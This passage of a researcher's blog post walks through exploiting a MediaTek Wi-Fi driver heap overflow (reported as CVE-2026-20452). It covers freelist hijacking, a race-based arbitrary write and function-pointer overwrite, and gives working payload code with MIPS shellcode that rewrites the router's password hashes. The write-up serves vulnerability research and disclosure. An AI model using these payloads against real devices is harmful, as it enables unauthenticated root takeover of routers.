+Now, freelist hijacking consists of corrupting the freelist pointer that sits at the start of a free object in the slab cache, redirecting the next allocation to an arbitrary location. In this case, this could be achieved using the previously identified heap overflow to overwrite the adjacent object freelist pointer. If this adjacent object is free, the freelist gets corrupted and points to an arbitrary location, allowing the attacker to control where the new allocation will land. If any predictable data is written into that newly allocated object, this provides an arbitrary write primitive.
+
+In this case, the heap overflow happened in 'kmalloc-128' (the smallest general use cache in my system). It would be impossible to target any bigger slab cache, since the maximum size of sub-items inside TLVs was 255 and that is not enough to corrupt adjacent objects in bigger caches, such as in 'kmalloc-256'. Also, it is also important to note that neither 'CONFIG_SLAB_FREELIST_RANDOM' not 'CONFIG_SLAB_FREELIST_HARDENED' were enabled, which are some kernel protections related to the freelist, so exploitation was easier. 
+
+So, let's suppose that this is the state of objects in the cache and the freelist before the overflow:
+
+<code>kmalloc-128 cache:
+
+<span class="token tag">[allocated][allocated]</span><span class="token punctuation">[free_1][free_2][free_3][free_4]</span>
+
+
+kmalloc-128 freelist:
+
+<span class="token punctuation">[free_1]</span>-&#62;<span class="token punctuation">[free_2]</span>-&#62;<span class="token punctuation">[free_3]</span>-&#62;<span class="token punctuation">[free_4]</span></code>
+
+After allocating the TLV buffer for the first 0x1049 TLV and then copying the second 0x1049 TLV that produced the overflow, the state of the cache should now look something like this:
+
+<code>kmalloc-128 cache:
+
+<span class="token tag">[allocated][allocated]</span><span class="token keyword">[TLV_buffer]</span><span class="token regex">[free_2]</span><span class="token punctuation">[free_3][free_4]
+                      ^^^^^^^^^^^^^^^^^^^^
+                        attacker payload</span></code>
+
+Since 'free_2' has been corrupted, its freelist pointer no longer points to 'free_3', but wherever the attacker payload makes it point to:
+
+<code>kmalloc-128 freelist:
+
+<span class="token regex">[free_2]</span>-&#62;<span class="token string">[arbitrary_location]</span>-&#62;<span class="token punctuation">[????]</span></code>
+
+Now, the next object allocated into 'kmalloc-128' will land regularly on the corrupted 'free_2'. However, the second object to be allocated into 'kmalloc-128' will then land on 'arbitrary_location', which is controlled by the attacker.
+
+Lastly, 'arbitrary_location' must contain a pointer to a valid freelist object or null (end of the freelist). Else, the next allocation on 'kmalloc-128' would immediately crash the kernel trying to follow the next entry on the freelist, rendering the exploit useless. Since finding a useful location which also contains a pointer to a valid freelist object results nearly impossible, it is easier to just use an 'arbitrary_location' that contains null, so that the freelist after the hijack looks something like this and execution can continue:
+
+<code>kmalloc-128 freelist:
+
+<span class="token regex">[free_2]</span>-&#62;<span class="token string">[arbitrary_location]</span>-&#62;<span class="token punctuation">[null]<span></code>
+
+With this approach in mind, I needed to find a suitable allocation after the overflow that would allow writing attacker-controlled data into 'arbitrary_location'. This proved to be the most challenging stage of the exploitation, as debugging dark-magic heap corruptions using only kernel panic messages and limited resources was extremely tedious. Too many hours later, I sort of found my target.
+
+After the overflow happens, the driver continues processing the extracted sub-item as follows:
+
+<code class="language-c">void WscSelectedRegistrar(int param_1, void *buf_ptr, uint buf_len, uint param_4) {
+    // overflow happens here during 0x1049 TLV processing
+    // ...
+
+    // requires a 0x1041 TLV inside the WPS packet
+    if (flag_1041){
+        WscBuildBeaconIE(..., sub_item, sub_item_len, ...);
+
+        // ...
+    }
+    // ...
+}</code>
+<code class="language-c">void WscBuildBeaconIE(...) {
+    // ...
+
+    WscGenV2Msg(..., sub_item, sub_item_len, ...);
+
+    // ...
+}</code>
+<code class="language-c">void WscGenV2Msg(...) {
+    os_alloc_mem(0, buf, 128); // buf gets allocated into kmalloc-128
+
+    // ...
+    
+    // sub-item is copied into buf
+    WscAppendV2SubItem(1, sub_item, sub_item_len, buf, ...);
+
+    // ...
+}</code>
+
+If a 0x1041 TLV with value 1 is present within the WPS packet, function 'WscGenV2Msg' is ultimately called. It first allocates 128 bytes for 'buf', which land in 'kmalloc-128', and then calls 'WscAppendV2SubItem', which copies the sub-item into 'buf'. This seemed like the perfect target for the exploit, since it would write controlled data to wherever the allocation landed. However, there was a critical ordering issue: the allocation of 'buf' was the first 'kmalloc-128' allocation after the overflow, not the second one. This meant it would land on the corrupted object itself, not at 'arbitrary_location'. For the freelist hijacking to work, I needed the second allocation to be the one that wrote attacker-controlled data.
+
+I reviewed the code trying to find any way to trigger an additional 'kmalloc-128' allocation between the overflow and 'WscGenV2Msg', but there was none. The execution flow was deterministic with no controllable branches that would add allocations. However, the answer wasn't in the code itself.
+
+The solution I ended up choosing was originally suggested by Claude, and consisted on exploiting the fact that the kernel somehow processes these WPS 'ioctl' messages concurrently. By sending multiple requests simultaneously, there was a chance that a 'kmalloc-128' allocation from a parallel thread could slip in between the overflow and the 'WscGenV2Msg' call. If the timing worked out, the concurrent thread's allocation would consume the corrupted freelist entry, making the 'WscGenV2Msg' allocation to land at 'arbitrary_location' and copying the sub-item there.
+
+So, I crafted a PoC that exploited this race condition by sending multiple WPS messages. Each message contained the following three TLVs:
+<ol><li>TLV 0x1041 (value 1): Triggers the code path that leads to 'WscGenV2Msg' allocation</li>
+<li>TLV 0x1049 (20 bytes): Creates the initial 'sub_item' buffer in 'kmalloc-128'</li>
+<li>TLV 0x1049 (132 bytes): Overflows 'sub_item' and corrupts the adjacent heap object by 4 bytes, overwriting its freelist pointer with 'WRITE_ADDR'</li></ol>
+In this case, I choose a 'WRITE_ADDR' for testing purposes which was full of 00s, so that the freelist would still be valid and the kernel could continue execution:
+
+<code class="language-python">WRITE_ADDR = 0x80ea0000
+
+wps_payload  = build_tlv(0x1041, b"\x01")
+wps_payload += build_tlv(0x1049, b"\x00\x00\x00" + b"\x01\x14" + b"A" * 20)
+wps_payload += build_tlv(0x1049, b"\x00\x00\x00" + b"\x01\x84" + b"A" * 128 + struct.pack(">I", WRITE_ADDR))</code>
+
+The PoC succeeded when the following conditions were met:
+<ol><li>The object next to the 'sub_item' buffer was free, so that its freelist pointer could be corrupted with 'WRITE_ADDR'</li>
+<li>Any concurrent thread performed an allocation into 'kmalloc-128' just between the overflow and the 'WscGenV2Msg' allocation, so that the last one landed on 'WRITE_ADDR'</li></ol>
+When successful, 'WscGenV2Msg' wrote an 8-byte WPS header plus 128 bytes of data from the second 0x1049 TLV into 'WRITE_ADDR', successfully providing an arbitrary write primitive!
+
+<img src="/assets/images/posts/2026-06-01/arbitrary_write.png" style="width: 40em">
+
+In such cases, the following kernel crash was produced immediately after the overflow, in which the discussed function call tree can be observed:
+
+<code>Kernel bug detected[#1]:
+CPU: 3 PID: 2847 Comm: wscd Tainted: P           O   3.18.21 #1
+task: 8a786ae0 ti: 838e8000 task.ti: 838e8000
+$ 0   : 00000000 0054d393 8101d3e0 00000001
+$ 4   : 80e9fff8 809b0000 80e9fff8 805741dc
+$ 8   : fffffff8 41414141 41414141 41414141
+$12   : 00000001 88289100 00000000 00012d96
+$16   : 838eb538 0000008c 838eb534 00000001
+$20   : 83b73280 00000084 c05f00a8 80ea0000
+$24   : 00000001 8022bda8
+$28   : 838e8000 838eb4d0 80951958 805741dc
+Hi    : 00000001
+Lo    : 00000000
+epc   : 800eba68 kfree+0x158/0x198
+    Tainted: P           O
+ra    : 805741dc WscGenV2Msg+0x104/0x15c
+Status: 11000003        KERNEL EXL IE
+Cause : 50807034
+PrId  : 0001992f (MIPS 1004Kc)
+Modules linked in: [...]
+est(PO) tcvlantag(O) tcportbind(O) tcsmux(O) module_sel(PO) [last unloaded: slic3]
+Process wscd (pid: 2847, threadinfo=838e8000, task=8a786ae0, tls=76e73960)
+Stack : 838eb538 805741dc 0000000f 00000000 bfb54000 838eb558 838eb4f0 838eb53c
+          86000000 80e9fff8 00000084 c05eed08 00000000 80ea0000 00000084 00000080
+          00000004 8054f5a4 00000001 88289426 c05eed08 00000001 838eb538 838eb534
+          01001958 000000c9 882893c9 88289300 dd040050 f2040000 00000000 882894b9
+          00000000 c0301000 c05eed08 00000001 80ea0000 8055dd80 8b279000 02b9c400
+          ...
+Call Trace:
+[&#60;800eba68&#62;] kfree+0x158/0x198
+[&#60;805741dc&#62;] WscGenV2Msg+0x104/0x15c
+[&#60;8054f5a4&#62;] WscBuildBeaconIE+0x33c/0x508
+[&#60;8055dd80&#62;] WscSelectedRegistrar+0x330/0x588
+[&#60;80339480&#62;] RTMPAPSetInformation+0x36d8/0x40a8
+[&#60;803470c8&#62;] rt28xx_ap_ioctl+0x508/0x900
+[&#60;805d87d0&#62;] rt28xx_ioctl+0x60/0xb0
+[&#60;807fb004&#62;] wext_handle_ioctl+0x200/0x28c
+[&#60;806967bc&#62;] dev_ioctl+0x104/0x698
+[&#60;8010ea0c&#62;] do_vfs_ioctl+0xa0/0x6cc
+[&#60;8010f0dc&#62;] SyS_ioctl+0xa4/0xb8
+[&#60;8001b424&#62;] handle_sys+0x124/0x144
+
+
+Code: 8c430000  3063c000  2c630001 &#60;00030336&#62; 8c430000  7c630380  10600002  00002821  8c450038
+---[ end trace 244decf0ed7df338 ]---</code>
+
+However, although a kernel crash was produced, the device did not reboot. Some network services died, such as 'wscd' itself or the HTTP server, but others such as SSH would still work (that is why I could verify with 'hexdump' that the arbitrary write had been successful).
+
+When an attempt failed because the adjacent heap object wasn't free, the device usually crashed and rebooted (there was a small amount of times in which it froze indefinitely). However, if the adjacent object was free but no concurrent allocation happened between the overflow and 'WscGenV2Msg', then the next 'kmalloc-128' allocation at 'WscAppendV2SubItem' would always land on 'WRITE_ADDR', which wrote only bytes '00 01 20 00':
+
+<img src="/assets/images/posts/2026-06-01/failed_arbitrary_write.png" style="width: 40em">
+
+This PoC was not reliable at all and often took many attempts for it to be successful. However, given the remote nature of the bug and that it was my first time dealing with kernel exploitation, I was quite happy with these results. So, next step was using this remote kernel arbitrary write to achieve some code execution :D
+
+
+----[ Achieving code execution ]----------------------
+
+The strategy now was finding a set of function pointers that would be dereferenced automatically or on demand, to redirect execution to shellcode. Since KASLR was not enabled, I just needed to find the right addresses. However, there were some constraints in place:
+<ol><li>The target area to be overwritten needed to start with 4 null bytes, since the kernel would still try to traverse the corrupted freelist pointer to allocate the next object after the exploit. If the first 4 bytes weren't valid, the allocator would crash immediately.</li>
+<li>On a failed attempt, the exploit needed to cause a reboot, since it required many attempts to succeed. To do so, the first 4 bytes of the target area needed to be dereferenced so that the bytes written automatically on failed attempts would crash the device. Else, 'wscd' would go down but the system would stay up, preventing exploitation.</li>
+<li>On a successful attempt, a WPS header of 8 bytes was written before the controlled data, meaning that any target function pointer had to be located at a minimum of 8 bytes into the target area.</li></ol>
+Too many hours later of long Claude sessions, reading kernel code and doing a lot of manual testing on the device, I finally found some function pointers that met these requirements. They were located in something like a protocol handler table at '0x8084f864':
+
+<code>8084f864: 00 00 00 00  - null (icmp_early_demux?)
+8084f868: 80 72 f7 a8  - icmp_rcv
+8084f86c: 80 72 fb ec  - icmp_err
+
+...
+
+8084f880: 80 72 ae 94  - udp_v4_early_demux
+8084f884: 80 72 ae 3c  - udp_rcv
+8084f888: 80 72 9b c8  - udp_err
+
+...
+
+8084f890: 80 71 df 90  - tcp_v4_early_demux
+8084f894: 80 71 e1 00  - tcp_v4_rcv
+8084f898: 80 71 d5 44  - tcp_v4_err</code>
+
+The first 4 bytes at '0x8084f864' were null, satisfying the first constraint. Additionally, when writing something to these first 4 bytes, they were dereferenced upon receiving an ICMP packet. On failed attempts, the exploit would write '00 01 12 00' there, which allowed crashing the device by sending a single ping, satisfying the second constraint:
+
+<code>CPU 3 Unable to handle kernel paging request at virtual address 00012000, epc == 00012000, ra == 806f4b68
+Oops[#2]:
+CPU: 3 PID: 0 Comm: swapper/3 Tainted: P      D    O   3.18.21 #1
+task: 8ec43de0 ti: 8ec84000 task.ti: 8ec84000
+$ 0   : 00000000 00000000 00012000 00000004
+$ 4   : 8c1d0800 00000000 00000002 00000000
+$ 8   : 00000001 344984ae 8ec877a0 cac9e831
+$12   : 00000000 00000000 00000000 084365b2
+$16   : 8c1d0800 8c1d8894 8866b000 809b32b4
+$20   : 00000800 00000000 809b2e90 809b0000
+$24   : 00000000 80753668                  
+$28   : 8ec84000 8ec87a10 80ea7100 806f4b68
+Hi    : 00000103
+Lo    : c1dec000
+epc   : 00012000 0x12000
+    Tainted: P      D    O  
+ra    : 806f4b68 ip_rcv_finish+0x1a8/0x520
+[...]</code>
+
+Lastly, multiple function pointers were present after the initial 8 bytes. Specifically, pointers to 'udp_rcv' and 'tcp_v4_rcv' were dereferenced early in the network stack whenever UDP or TCP packets arrived, satisfying the third constraint.
+
+As a side note, on a successful write, 'icmp_rcv' was overwritten with the WPS header that 'WscGenV2Msg' automatically writes. So, in theory, if an ICMP packet arrived before any TCP or UDP packet, this 'icmp_rcv' would be called instead of 'udp_rcv' or 'tcp_v4_rcv', crashing the target. However, this was never the case in all tests performed and, if it ever happened, it would just reboot the device as in any failed attempt, so this was not a big deal at all.
+
+With all this in place, I was able to redirect execution anywhere. So, I vibe-coded some quick shellcode that just printed 'hacked by hacefresk0' in the UART and crashed. Then, I included it on the payload itself to be able to jump there directly:
+
+<code class="language-python">WRITE_ADDR       = 0x8084f864
+SHELLCODE_ADDR   = WRITE_ADDR + 52
+
+payload = (
+    #### wps header added on successful writes before payload
+    # \x00\x37\x2a\x00 
+    # \x01\x20\x01\x84
+    ####
+
+    b"\x00\x00\x00\x00" * 6           +
+
+    struct.pack(">I", SHELLCODE_ADDR) + # 0x8084f884 - udp_rcv
+
+    b"\x00\x00\x00\x00" * 3           +
+
+    struct.pack(">I", SHELLCODE_ADDR) + # 0x8084f894 - tcp_v4_rcv
+
+    #### shellcode (prints "hacked by hacefresk0")
+
+    b"\x04\x11\x00\x01"               + #       bal .+8
+    b"\x27\xf0\x00\x24"               + #       addiu $s0, $ra, 0x24  (string addr)
+    b"\x3c\x11\x80\x00"               + #       lui $s1, 0x8000
+    b"\x36\x31\x2b\x00"               + #       ori $s1, $s1, 0x2b00  (prom_putchar)
+    b"\x92\x04\x00\x00"               + # loop: lbu $a0, 0($s0)
+    b"\x10\x80\x00\x05"               + #       beqz $a0, end
+    b"\x00\x00\x00\x00"               + #       nop
+    b"\x02\x20\xf8\x09"               + #       jalr $s1
+    b"\x26\x10\x00\x01"               + #       addiu $s0, $s0, 1  (delay slot)
+    b"\x10\x00\xff\xfa"               + #       b loop
+    b"\x00\x00\x00\x00"               + #       nop
+    b"hacked by hacefresk0\n\x00"     +
+
+    ####
+
+    b"\x00\x00"                       +
+    b"\x00\x00\x00\x00" * 4           +
+
+    #### freelist pointer of adjacent object
+
+    struct.pack(">I", WRITE_ADDR)
+)</code>
+
+Then, I added some logic to ping the device when it stopped responding, so it triggered reboots on failed attempts.
+
+Finally, I also included some initial heap spraying by sending several regular TLVs, so that many allocations and frees happened in 'kmalloc-128' before the overflow. Although I originally did not believe in this too much, testing revealed that it actually worked somehow. This improved the reliability of the exploit, which ended up working around 1 out of 15 times or so. There was, however, a possibility that the device could freeze if a crash failed to trigger a reboot and left the system too corrupted to continue running. Since this did not happen too often and resolving it would probably take too much effort, I ignored the issue :D
+
+Although I am sure there are ways to improve the exploit further and make the whole process more efficient, this was already enough for me. So, after some failed attempts, the exploit finally achieved executing shellcode on the device!
+
+<img src="/assets/images/posts/2026-06-01/shellcode_exec.png" style="width: 55em">
+
+
+----[ Okay, but are 128 bytes enough? ]---------------
+
+If you have been paying attention, you will have realized that I can only execute around 120 bytes of shellcode due to the 128-byte arbitrary write limit. Initially, I was going to call this a success and move on. However, as I was writing this blog post, I realized that this wasn't enough. I needed to build a fully working exploit that could give me a root shell.
+
+After some more research, I figured out that trying to execute a reverse shell or modifying '/etc/passwd' to SSH in directly would require the exploit to return cleanly so that the device did not crash, which seemed like way too much effort. Plus, I had almost no room for long strings, and any cleanup code would probably leave no room for anything else given my tight 120-byte budget. So instead, I decided to target '/data/zcfg_config.json', a persistent config file that stored basically every parameter on the device. Crucially, it contained password hashes for each user that the device reads on boot to populate '/etc/shadow'. This way, I only needed to modify it and then wait for the device to reboot so that I could login via SSH.
+
+At this point, Claude was only helpful for translating MIPS instructions into bytecode, since I could not make it understand basic hex math nor shellcode optimizations. After a lot of trial and error, I managed to squeeze a shellcode into 120 bytes that executed 'sed -i s/\$6\$[^:]*/ab.oZPM0Sll9M/ /data/zcfg_config.json' asynchronously and then looped indefinitely. This replaced every password hash in the config file with the shortest hash corresponding to 'hacked':
+
+<code class="language-python">WRITE_ADDR       = 0x8084f864
+SHELLCODE_ADDR   = WRITE_ADDR + 8
+
+payload = (
+    #### wps header added on successful writes before payload
+    # \x00\x37\x2a\x00 
+    # \x01\x20\x01\x84
+    
+    #### shellcode + pointers + data
+
+    # $s1 = 0x8084f880 when jumping to shellcode
+    b"\x22\x24\x00\x2c"                  + # addiu $a0,$s1,0x2c ($a0 = /bin/sed)
+    b"\x22\x25\x00\x18"                  + # addiu $a1,$s1,0x18 ($a1 = argv array)
+    b"\x24\x06\x00\x00"                  + # addiu $a2,$0,0     ($a2 = 0)
+    b"\x24\x07\x00\x00"                  + # addiu $a3,$0,0     ($a3 = 0, UMH_NO_WAIT)
+    b"\x10\x00\x00\x02"                  + # b 2                (jump 24 bytes)
+    b"\x3c\x08\x80\x04"                  + # lui $t0,0x8004     ($t0 = call_usermodehelper upper)
+
+    struct.pack(">I", SHELLCODE_ADDR)    + # 0x8084f884 - udp_rcv   
+
+    b"\x35\x08\x2e\xcc"                  + # ori $t0,$t0,0x2ecc ($t0 = call_usermodehelper lower)
+    b"\x01\x00\x08\x09"                  + # jalr $t0           (call call_usermodehelper)
+    b"\x10\x00\xff\xff"                  + # b -1               (infinite loop)
+
+    struct.pack(">I", SHELLCODE_ADDR)    + # 0x8084f894 - tcp_v4_rcv
+
+    struct.pack(">I", 0x8084f8ac)        + # argv[0] = /bin/sed
+    struct.pack(">I", 0x8084f8b5)        + # argv[1] = -i
+    struct.pack(">I", 0x8084f8b8)        + # argv[2] = s/\$6\$[^:]*/ab.oZPM0Sll9M/
+    struct.pack(">I", 0x8084f8d4)        + # argv[3] = /data/zcfg_config.json
+    struct.pack(">I", 0x00000000)        + # argv[4] = null
+
+    b"/bin/sed\x00"                      + # 0x8084f8ac
+    b"-i\x00"                            + # 0x8084f8b5
+    b"s/\\$6\\$[^:]*/ab.oZPM0Sll9M/\x00" + # 0x8084f8b8
+    b"/data/zcfg_config.json\x00"        + # 0x8084f8d4
+        
+    b"\x00"                              +
+
+    #### freelist pointer of adjacent object
+
+    struct.pack(">I", WRITE_ADDR)
+)
+</code>
+
+After some waiting, I finally had it: an unauthenticated remote kernel heap overflow exploit that modified root password!
+
+<img src="/assets/images/posts/2026-06-01/kernel_rce.png" style="width: 40em">
+
+I reported this vulnerability to Mediatek and it was assigned CVE-2026-20452. Again, you can take a look into the exploit at my <a href="https://github.com/hacefresko/CVEs/tree/main/CVE-2026-20452">at my github page</a>.
+
+
+----[ Conclussions ]----------------------------------
+
+This has been the longest and most advanced research I have done, and the length of this blog post accurately reflects it. If you have reached the end, thank you so much. I hope you liked it and enjoyed it :D
+
+{% endraw %}
